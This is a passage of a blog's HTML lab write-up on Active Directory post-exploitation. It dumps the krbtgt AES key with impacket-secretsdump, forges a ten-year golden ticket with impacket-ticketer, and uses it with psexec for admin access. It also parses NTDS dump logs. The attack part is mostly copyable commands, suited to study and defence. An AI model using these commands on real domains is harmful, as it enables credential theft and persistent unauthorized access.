+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> file in /home/kali/.nxc/logs/*.ntds; <span style="color:#66d9ef">do</span> cat <span style="color:#e6db74">&#34;</span>$file<span style="color:#e6db74">&#34;</span> | cut -d <span style="color:#e6db74">&#39;:&#39;</span> -f1,2,4 --output-delimiter<span style="color:#f92672">=</span><span style="color:#e6db74">&#39; &#39;</span> | awk <span style="color:#e6db74">&#39;{print $3, $2, $1}&#39;</span>; printf <span style="color:#e6db74">&#39;\n&#39;</span>; <span style="color:#66d9ef">done</span></span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-15-082225_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="creating-a-kerberos-golden-ticket">Creating a Kerberos Golden Ticket:</h3>
+<ul>
+<li>
+<p><strong>Using</strong> <code>impacket-lookupsid</code> <strong>to get the Search for the Domain SID</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="impacket-lookupsid%20$domain/$user@$machine.$domain%20-domain-sids%20-k%20-no-pass">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>impacket-lookupsid $domain/$user@$machine.$domain -domain-sids -k -no-pass</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-15-082328_.png">
+</figure>
+</li>
+<li>I store this in the variable <code>$sid</code></li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p><strong>Using</strong> <code>impacket-secretsdump</code> <strong>to retrieve the</strong> <code>aeskey</code> <strong>of the</strong> <code>krbtgt</code> <strong>account</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="impacket-secretsdump%20$domain/$user@$box%20-hashes%20:$hash">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>impacket-secretsdump $domain/$user@$box -hashes :$hash</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-15-082620_.png">
+</figure>
+</li>
+<li>I store <code>krbtgt:aes256</code> value in the variable <code>$krbtgt</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Sync our clock to the host using ntpdate</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#Using%20ntpdate%0asudo%20ntpdate%20-s%20$domain%0a%0a#Using%20faketime%0afaketime%20%22$%28ntpdate%20-q%20$domain%20%7c%20cut%20-d%20%27%20%27%20-f%201,2%29%22">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Using ntpdate</span>
+</span></span><span style="display:flex;"><span>sudo ntpdate -s $domain
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Using faketime</span>
+</span></span><span style="display:flex;"><span>faketime <span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>ntpdate -q $domain | cut -d <span style="color:#e6db74">&#39; &#39;</span> -f 1,2<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span></span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<p><strong>Using</strong> <code>impacket-ticketer</code> <strong>to create the Golden Ticket</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#Using%20-aeskey%0aimpacket-ticketer%20-aesKey%20$krbtgt%20-domain-sid%20$sid%20-domain%20$domain%20Administrator">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Using -aeskey</span>
+</span></span><span style="display:flex;"><span>impacket-ticketer -aesKey $krbtgt -domain-sid $sid -domain $domain Administrator</span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<p><strong>Export the ticket to the</strong> <code>KRB5CCNAME</code> <strong>Variable</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="export%20KRB5CCNAME=./Administrator.ccache">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>export KRB5CCNAME<span style="color:#f92672">=</span>./Administrator.ccache</span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<p><strong>Verify the ticket is loaded into memory</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="klist">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <pre><code>klist</code></pre>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-15-083332_.png">
+</figure>
+</li>
+<li>As we can see this ticket lasts for 10 years, which is better than 10 hours.</li>
+</ul>
+</li>
+<li>
+<p><strong>Use the ticket for connecting via</strong> <code>psexec</code></p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="impacket-psexec%20-k%20-no-pass%20$machine.$domain">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>impacket-psexec -k -no-pass $machine.$domain</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-15-084603_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="why-create-a-golden-ticket">Why create a golden ticket?</h4>
+<ul>
+<li>&ldquo;But bloodstiller why are you making a golden ticket if you have the admin hash?&rdquo; Glad you asked:
+<ul>
+<li>Creating a Golden Ticket during an engagement is a reliable way to maintain access over the long haul. Here’s why:</li>
+<li><code>KRBTGT</code> <strong>Hash Dependence</strong>:
+<ul>
+<li>Golden Tickets are generated using the <code>KRBTGT</code> account hash from the target’s domain controller.</li>
+<li>Unlike user account passwords, <code>KRBTGT</code> hashes are rarely rotated (and in many organizations, +they are never changed+), so in most cases the Golden Ticket remains valid indefinitely.</li>
+</ul>
+</li>
+<li><code>KRBTGT</code> <strong>Hash—The Key to It All (for upto 10 years)</strong>:
+<ul>
+<li>A Golden Ticket can allow you to maintain access to a system for up to 10 years (yeah, you read that right the default lifespan of a golden ticket is 10 years) without needing additional credentials.</li>
+<li>This makes it a reliable backdoor, especially if re-access is needed long after initial entry.</li>
+<li><strong>Think about it</strong>: even if they reset every user’s password (including the administrator etc) your Golden Ticket is still valid because it’s tied to the <code>KRBTGT</code> account, not individual users.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="lessons-learned">Lessons Learned:</h2>
+<h3 id="what-did-i-learn">What did I learn?</h3>
+<ol>
+<li>Stop jumping to flashy techniques when you havent&rsquo; even performed basic enumeration just yet. (Finding password re-use in a file)</li>
+<li>I learned that even though I know the attack path if someone has put a cleanup script in place it will cause me to go down a rabbit hole, it&rsquo;s one of the few times where faster is better.</li>
+</ol>
+<h3 id="what-silly-mistakes-did-i-make">What silly mistakes did I make?</h3>
+<ol>
+<li>using \\ on http request e.g <code>http:\\</code> DAMN YOU WINDOWS and your backslashes.</li>
+</ol>
+<h2 id="sign-off">Sign off:</h2>
+<p>Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!</p>
+<p>Until next time, hack the planet!</p>
+<p>– Bloodstiller</p>
+<p>– Get in touch bloodstiller at bloodstiller dot com</p>
+
+            
+        </div>
+    </article>
+
+        </main>
+
+        <footer class="footer">
+    <div class="footer-left">
+        <ul class="social">
+            
+                <li>All Rights Reserved ®.</li>
+            
+
+            
+                <li>Bloodstiller</li>
+            
+
+            
+                
+            
+                
+            
+                
+                    <li>
+                        
+                            <a href="https://github.com/bloodstiller" target="_blank">
+                                <i class="bi-github"></i>
+                            </a>
+                        
+
+                    </li>
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+        </ul>
+    </div>
+
+    <div class="footer-right">
+        <ul class="control status clearfix">
+            
+                <li>
+                    
+                        Word Count:
+                        4596
+                    
+                </li>
+            
+
+
+            
+                <li>en</li>
+            
+
+            
+
+            
+
+            
+                <li>
+                    
+                        Last modified: &nbsp;
+                        <time>
+                            Jan 14 2025 00:00:00
+                        </time>
+                    
+                </li>
+            
+
+            
+        </ul>
+    </div>
+</footer>
+
+    </body>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/codeblock_copy.c59588ba3a219dafab515508b0bcd2d0592dc9e0e08de20dc1983bfd8cb69d03d37c78eadd81ee7bef724570f9e4286d9ea1c53ca59d3711c0bcad9e9134d0e9.js"
+            integrity="sha512-xZWIujohna&#43;rUVUIsLzS0FktyeDgjeINwZg7/Yy2nQPTfHjq3YHue&#43;9yRXD55ChtnqHFPKWdNxHAvK2ekTTQ6Q=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/custom.e55ae031ca7d8c1e9bde9a72058dd382e3de5ff9b7df41d6d0e4ccb82ff9962e74b4865412dc15db16e5f16012d5cf9e2330b9826a3a36d5a272077f70e1341b.js"
+            integrity="sha512-5VrgMcp9jB6b3ppyBY3TguPeX/m330HW0OTMuC/5li50tIZUEtwV2xbl8WAS1c&#43;eIzC5gmo6NtWicgd/cOE0Gw=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/dir_toggle.e6f8c63f3ed9aefa9cedb3be3d5ab67e00bc3cf87a8dd7ef1ed55d642e9a7d80837636a26ae77f967f2aa74a44ae70c4134e25abca587f048c60807ba9e9c82f.js"
+            integrity="sha512-5vjGPz7Zrvqc7bO&#43;PVq2fgC8PPh6jdfvHtVdZC6afYCDdjaiaud/ln8qp0pErnDEE04lq8pYfwSMYIB7qenILw=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/sidebar.01b59c615736643387108a100de70c51d5e98477bdc338244a87d37f7e38286b48683459eade68087f0688f0235e7a48691e633954fa930d41823e9ddf797085.js"
+            integrity="sha512-AbWcYVc2ZDOHEIoQDecMUdXphHe9wzgkSofTf344KGtIaDRZ6t5oCH8GiPAjXnpIaR5jOVT6kw1Bgj6d33lwhQ=="></script>
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link
+    rel="stylesheet"
+    href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" />
+
+
+
+
+</html>
